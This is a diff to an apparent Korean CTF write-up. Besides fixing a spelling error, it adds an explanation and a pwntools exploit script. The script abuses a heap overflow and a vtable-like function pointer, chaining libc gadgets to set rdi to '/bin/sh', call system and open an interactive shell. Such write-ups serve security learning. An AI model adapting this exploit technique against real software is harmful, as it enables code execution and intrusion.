@@ -39,7 +39,7 @@ void update(void)
 }
 ```
 
-`v3`은 `heap chunk`를 가르키는 주소이다. `v3 chunk`에 `vtable`의 역할을 하는 다른 `chunk`의 주소가 있다. `*v3`에 저장되어 있는 함수 포인터를 참조하여 실행시키는 걸 알 수 있다. 이 문제에는 `heap overflow`가 있기 때문에 `vtable overwrite`는 할 수 있지만 `rdi`가 `v3`이라서 `rdi`에 `&"/bin/sh"`를 저장할 수가 없다. 
+`v3`은 `heap chunk`를 가리키는 주소이다. `v3 chunk`에 `vtable`의 역할을 하는 다른 `chunk`의 주소가 있다. `*v3`에 저장되어 있는 함수 포인터를 참조하여 실행시키는 걸 알 수 있다. 이 문제에는 `heap overflow`가 있기 때문에 `vtable overwrite`는 할 수 있지만 `rdi`가 `v3`이라서 `rdi`에 `&"/bin/sh"`를 저장할 수가 없다. 
 
 ```asm
 mov     rax, [rbp+var_18]
@@ -51,4 +51,21 @@ mov     rdi, rax
 call    rdx
 ```
 
-어셈블리어로 보면 위와 같다. 위의 분석에 따르면 `rdx, rdi, rax` 모두 `heap` 영역을 가리킨다. 
+어셈블리어로 보면 위와 같다. 위의 분석에 따르면 `rdx, rdi, rax` 모두 `heap` 영역을 가리킨다. 따라서 `heap overflow` 취약점을 이용해서 `mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]` 가젯의 `offset`을 잘 맞춰서 값을 세팅해주면 `rdi`도 변조하고 `system`도 호출할 수 있다.
+
+```python
+ret = l.address + 0x000000000002882f
+mov_rdi_qword_ptr_rdi_0x10_call_qword_ptr_rax_0x380 = l.address + 0x00000000000984df
+call_qword_ptr_rax_0x18 = l.address + 0x000000000008ac50
+binsh = list(l.search(b'/bin/sh'))[0]
+payload = p64(ret) * 3 + p64(mov_rdi_qword_ptr_rdi_0x10_call_qword_ptr_rax_0x380)
+payload = payload.ljust(0x100, b'\x00') + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
+payload += b'\x00' * 0x8 + p64(binsh) + p64(l.sym['system']) +  b'\x00' * 0xe8 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
+payload += b'\x00' * 0x100 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
+payload += b'\x00' * 0x100 + p32(0) + p32(20) + p32(7) + p32(0) + p64(0x121) + p64(heap_base + 0x13a38)
+payload += p64(0) * 3 + p64(call_qword_ptr_rax_0x18)
+print(hex(l.sym['system']))
+#gdb.attach(p, '\n'.join(gdb_cmds2))
+create(1, payload)
+p.interactive()
+```
